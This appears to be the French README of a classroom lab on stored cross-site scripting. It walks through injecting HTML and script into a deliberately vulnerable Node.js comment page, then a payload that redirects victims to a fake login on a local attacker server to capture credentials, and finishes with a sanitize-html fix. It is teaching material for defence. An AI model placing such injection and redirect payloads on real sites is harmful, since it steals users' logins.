# Démonstration de Vulnérabilité Stored XSS

Ce TP permet d'explorer et de comprendre les vulnérabilités XSS (Cross-Site Scripting) stockées dans une application web, ainsi que leur impact sur la sécurité.

## 🎯 Objectifs
- Comprendre le fonctionnement d'une attaque XSS stockée
- Détecter les vulnérabilités XSS
- Implémenter une attaque de vol d'identifiants
- Apprendre à sécuriser une application contre les XSS

## 🛠️ Prérequis

### Matériel
- Node.js installé sur votre machine
- Un navigateur web moderne
- Un éditeur de code

### Installation
1. Cloner le dépôt :
```bash
git clone http://github.com/bouhenic/xss.git
cd xss/xssStored/vulnerableServer
```

2. Lancer l'application :
```bash
node index.js
```

## 📋 Structure du TP

### A. Détection des Vulnérabilités XSS

1. **Connexion à l'application**
   - URL : `http://localhost:3000/login`
   - Identifiants : user1/password1

2. **Test d'Injection HTML**
   ```html
   <h1>STORED XSS</h1>
   ```
   - Observer le comportement via l'inspecteur du navigateur

3. **Test d'Injection JavaScript**
   ```javascript
   <script>alert("stored xss");</script>
   ```

### B. Attaque XSS Stored

1. **Configuration du Serveur Attaquant**
   ```bash
   # Terminal 1 - Serveur Vulnérable
   node index.js    # Port 3000

   # Terminal 2 - Serveur Attaquant
   cd vulnerableServer
   node index.js    # Port 4000
   ```

2. **Script de Redirection Malveillant**
   ```javascript
   <script>
     window.location.href = 'http://localhost:4000/login';
   </script>
   ```

### C. Simulation d'Attaque

1. **Connexion Victime**
   - URL : `http://localhost:3000/login`
   - Identifiants : user2/password2
   - Observer la redirection automatique

2. **Vérification des Identifiants Volés**
   - Consulter les logs du serveur attaquant

### D. Sécurisation de l'Application

1. **Implémentation du Sanitizer**
   ```javascript
   const sanitizeHtml = require('sanitize-html');

   app.post('/comments', isAuthenticated, (req, res) => {
       const sanitizedComment = sanitizeHtml(req.body.comment, {
           allowedTags: [], // Pas de balises autorisées
           allowedAttributes: {} // Pas d'attributs autorisés
       });
       comments.push(sanitizedComment);
       res.redirect('/comments');
   });
   ```

## 🔐 Points de Sécurité

### Vulnérabilités Démontrées
- Injection de HTML/JavaScript
- Redirection automatique
- Vol d'identifiants

### Mesures de Protection
- Sanitization des entrées utilisateur
- Désactivation des balises HTML dangereuses
- Validation côté serveur

## 👥 Comptes de Test

| Utilisateur | Mot de passe | Description |
|------------|--------------|-------------|
| user1      | password1    | Compte attaquant |
| user2      | password2    | Compte victime   |

## 🌐 Configuration des Serveurs

| Serveur    | Port | Description |
|------------|------|-------------|
| Vulnérable | 3000 | Application principale |
| Attaquant  | 4000 | Serveur malveillant |

## ⚠️ Avertissement

Ce projet est destiné à des fins éducatives uniquement. Ne pas utiliser ces techniques sur des systèmes réels sans autorisation.

## 📚 Documentation Complémentaire

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Documentation Sanitize-HTML](https://github.com/apostrophecms/sanitize-html)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)